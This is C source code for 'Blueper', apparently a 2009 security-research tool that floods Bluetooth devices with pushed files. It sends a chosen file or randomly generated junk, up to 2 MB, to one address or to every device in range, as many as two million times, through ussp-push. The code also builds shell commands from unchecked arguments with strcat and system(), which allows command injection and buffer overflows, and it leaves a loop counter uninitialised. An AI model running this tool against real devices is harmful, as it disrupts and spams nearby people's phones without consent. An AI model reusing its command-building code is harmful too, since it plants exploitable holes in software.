/* 
   Blueper 
   Copyright (C) 2009 Shadow Cave LLC

   Written 2009 by JP Dunning (.ronin)
   ronin@shadowcave.org
   <www.hackfromacave.com>
 
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License version 2 as
   published by the Free Software Foundation;

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
   OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS.
   IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE FOR ANY 
   CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY DAMAGES 
   WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
   OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN 
   CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

   ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS, 
   COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE IS 
   DISCLAIMED.
*/

#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>


// Help for blueper
int ShowHelp()
{	
	printf("\nblueper v0.4 by John P Dunning <ronin@shadowcave.org>\n(c) ShadowCave LLC.\n");
	printf("\n");
	printf("NAME\n");
	printf("   blueper\n\n");
	printf("SYNOPSIS\n");
	printf("   blueper [-i iterations] [options] [file] [target] \n\n");
	printf("DESCRIPTION\n");
	printf("   [btaddr]\t\tAddress of the target device.  Format: XX:XX:XX:XX:XX:XX\n");
	printf("   -a\t\t\tPush file to all devices in range\n");
	printf("   -c [channel]\t\tBluetooth OBEX channel.  Default is system selected\n");
	printf("   -e\t\t\tAdd counter to the end of the remote file name\n");
	printf("   -h\t\t\tHelp\n");
	printf("   -i [iterations]\tNumber of times to upload file\n");
	printf("   -l [local_file]\tLocal file to be uploaded to the remote device\n");
	printf("   -n [temporary_file]\tName and location to create temporary file for sending\n");
	printf("   -r [remote_name]\tRemote file name\n");
	printf("   -s [size]\t\tSize of the file to be generated and uploaded\n");
	printf("\n");

	return 0;
}

// Used to generate a file of specified length
int GenerateFile(char * tempfile, int size)
{
	FILE *fp;
	
	// Create file
	if((fp = fopen(tempfile, "a")) == NULL)
		return 1;

	int i = 0;
	
	// Add data to file
	while (i < size) {
		fprintf(fp, "%c", rand()%255);
		i++;
	}

	fclose (fp);
	return 0;
}

// Scan for all Bluetooth devices and upload files to them
// http://people.csail.mit.edu/albert/bluez-intro/c404.html
int AllPush(char * file, char * tempfile, int size, int times, char * rfile, int addcount, char * channel)
{
	inquiry_info *ii = NULL;
	int max_rsp, num_rsp;
	int dev_id, sock, len, flags;
	int i;
	int t_count;
	char addr[19] = { 0 };
	char name[248] = { 0 };
	
	dev_id = hci_get_route(NULL);
	sock = hci_open_dev( dev_id );
	if (dev_id < 0 || sock < 0) {
		perror("error: opening socket");
		return 1;
	}
	
	len  = 8;
	max_rsp = 255;
	flags = IREQ_CACHE_FLUSH;
	ii = (inquiry_info*)malloc(max_rsp * sizeof(inquiry_info));
	
	num_rsp = hci_inquiry(dev_id, len, max_rsp, NULL, &ii, flags);
	if( num_rsp < 0 ) {
		perror("no devices found");
		return 1;
	}
	
	for (t_count; t_count < times; t_count++) {
		for (i = 0; i < num_rsp; i++) {
			ba2str(&(ii+i)->bdaddr, addr);
			memset(name, 0, sizeof(name));
			if (hci_read_remote_name(sock, &(ii+i)->bdaddr, sizeof(name), name, 0) < 0)
				strcpy(name, "[unknown]");
			printf("Pushing file to %s [%s] with remote name %s\n", addr, name, rfile);

			if (addcount > 0)
				AllCallPush(addr, file, tempfile, size, times, rfile, i, channel);
			else
				AllCallPush(addr, file, tempfile, size, times, rfile, -1, channel);
		}
	}
	
	free( ii );
	close( sock );

	return 0;
}

// Set all varaible to correctly call ussp-push and loop a specific number of times
int AllCallPush(char * target, char * file, char * tempfile, int size, int times, char * rfile, int counter, char * channel)
{

//	char command[255] = "./timeout 100 ussp-push ";
	char command[255] = "ussp-push ";
	strcat(command, target);
	strcat(command, "@");
	strcat(command, channel);
	strcat(command, " ");

	// Check for creation of temporary file or use of provided file
	if (size > 0) {
		if ((GenerateFile(tempfile, size)) == 0) {
			strcat(command, tempfile);
		} else {
			perror("error: temporary file cannot be created. \n");
			return 1;
		}
	} else {
		strcat(command, file);
	}

	strcat(command, " ");
	strcat(command, rfile); // File name		

	char cmd[255] = "";
	char num[20];

	strcpy(cmd, command);

	if (counter >= 0) {	
		sprintf(num, "_%i", rand()%999); // Append random number to end of file
		strcat(cmd, num);
	}
	
//	printf(cmd);
//	printf("\n");
		
	// Exicute ussp-push command
	system(cmd);

	// Delete temporarily file
	if (size > 0) {
		char rm[255] = "rm ";
		strcat(rm, tempfile);
		system(rm);
	}
	
	return 0;
}


// Set all varaible to correctly call ussp-push and loop a specific number of times
int CallPush(char * target, char * file, char * tempfile, int size, int times, char * rfile, int addcount, char * channel)
{

//	char command[255] = "./timeout 100 ussp-push ";
	char command[255] = "ussp-push ";
	strcat(command, target);
	strcat(command, "@");
	strcat(command, channel);
	strcat(command, " ");

	// Check for creation of temporary file or use of provided file
	if (size > 0) {
		if ((GenerateFile(tempfile, size)) == 0) {
			strcat(command, tempfile);
		}
		else {
			perror("error: temporary file cannot be created. \n");
			return 1;
		}
	}
	else {
		strcat(command, file);
	}

	strcat(command, " ");
	strcat(command, rfile); // File name
	
	int i = 0;

	// Run 'times' number of times
	while (i < times) {

		char cmd[255] = "";
		char num[20];
		strcpy(cmd, command);

		if (addcount > 0)	{
			sprintf(num, "_%i", rand()%999); // Append random number to end of file
			strcat(cmd, num);
		} 

//		printf(cmd);
//		printf("\n");
		printf("Pushing file to [%s] with remote name %s\n", target, rfile);
		
		// Exicute ussp-push command
		system(cmd);

		// Incrament counter
		i++;
	} 
	
	// Delete temporarily file
	if (size > 0) {
		char cmd[255] = "rm ";
		strcat(cmd, tempfile);
		system(cmd);
	}
	
	return 0;
}

int main(int argc, char **argv)
{
	char * target = "";
	char * file = "";
	char * tempfile = "";
	char * rfile = "blueper";
	int alldevs = 0;
	int times = 10;
	int size = 0;
	int i = 1;
	int alltags = 0;
	int addcount = 0;
	char * channel = " ";

	//for (int i = 1; i < argc; i++) {
	while (i < argc) {
		if (strcmp(argv[i], "-h") == 0) {
			ShowHelp();
			return 0;
		} else if ((strlen(argv[i]) == 12) || (strlen(argv[i]) == 17)) {
			target = argv[i];
		} else if (strcmp(argv[i], "-l") == 0) {
			if (++i < argc)
				file = argv[i];
		} else if (strcmp(argv[i], "-n") == 0) {
			if (++i < argc)
				tempfile = argv[i];
		} else if (strcmp(argv[i], "-s") == 0) {
			if (++i < argc)
				size = atoi(argv[i]);
		} else if (strcmp(argv[i], "-r") == 0) {
			if (++i < argc)
				rfile = argv[i];
		} else if (strcmp(argv[i], "-i") == 0) {
			if (++i < argc)
				times = atoi(argv[i]);
		} else if (strcmp(argv[i], "-c") == 0) {
			if (++i < argc)
				channel = argv[i];
		} else if (strcmp(argv[i], "-a") == 0) {
			alldevs = 1;
		} else if (strcmp(argv[i], "-e") == 0) {
			addcount = 1;
		} else {
			ShowHelp();
			return 1;
		}

		i++;
	}

	// Check to make sure correct flags are set
	if ((((strlen(target) == 12) || (strlen(target) == 17)) || (alldevs > 0)) && ((strlen(file) > 0) || ((strlen(tempfile) > 0) &&((size > 0)&&(size < 2000000)))) && ((times > 0)&&(times < 2000000))) {
		if (alldevs == 0)
			CallPush(target, file, tempfile, size, times, rfile, addcount, channel);
		else
			AllPush(file, tempfile, size, times, rfile, addcount, channel);
	}
	else {
		ShowHelp();
		return 0;
	}
	return 0;
}
 
